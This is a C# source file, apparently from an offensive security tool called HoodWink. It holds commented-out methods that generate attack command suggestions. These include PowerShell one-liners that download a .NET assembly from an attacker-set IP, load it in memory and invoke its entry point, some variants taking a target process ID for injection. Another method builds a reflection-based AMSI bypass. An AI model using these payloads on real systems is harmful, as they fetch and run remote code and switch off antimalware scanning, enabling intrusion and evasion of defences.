namespace HoodWink.Suggestions
{
    public static class Commands
    {
        //public static void Suggest(string filename, Types type)
        //{
        //    // string ip = GetIpAddress();
        //    string ip = "192.168.0.1";

        //    if (type == Types.Inline)
        //    {
        //        string inMemory = @"$bytes = (Invoke-WebRequest ""http://" + ip + "/" + filename + @""").Content;$assembly = [System.Reflection.Assembly]::Load($bytes);$entryPointMethod = $assembly.GetType('Genni.MainClass', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');$entryPointMethod.Invoke($null, (, [string[]] ('', '')));";
        //        WriteService.Suggestion("PowerShell one-liner", inMemory);
        //    }
        //    else if (type == Types.Remote)
        //    {
        //        string inMemory = @"$bytes = (Invoke-WebRequest ""http://" + ip + "/" + filename + @""").Content;$assembly = [System.Reflection.Assembly]::Load($bytes);$entryPointMethod = $assembly.GetType('Genni.MainClass', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');$entryPointMethod.Invoke($null, (, [string[]] ('<PID>', '')));";
        //        WriteService.Suggestion("PowerShell one-liner (replace <PID>)", inMemory);
        //    }
        //    else if (type == Types.Spawn)
        //    {
        //        string inMemory = @"$bytes = (Invoke-WebRequest ""http://" + ip + "/" + filename + @""").Content;$assembly = [System.Reflection.Assembly]::Load($bytes);$entryPointMethod = $assembly.GetType('Genni.MainClass', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');$entryPointMethod.Invoke($null, (, [string[]] ('', '')));";
        //        WriteService.Suggestion("PowerShell one-liner", inMemory);
        //    }
        //}

        //public static void SuggestAmsiBypass() // [!] This one gets caught by MS Defender
        //{
        //    string amsiBypass = @"$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like ""*iutils"") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like ""*itFailed"") {$f = $e}};Write-Host $f;$f.SetValue($null,$true)";
        //    WriteService.Suggestion("Amsi Bypass", amsiBypass);
        //}

        // private static async Task<string> GetIpAddress() // Gets first IP in list
        // {
        //     string hostname = Dns.GetHostName();
        //     IPAddress[] addresses = await Dns.GetHostAddressesAsync(hostname);            
        //     IPAddress firstAddress = addresses.First(a => a.AddressFamily == AddressFamily.InterNetwork);
        //     return firstAddress.ToString();
        // }
    }
}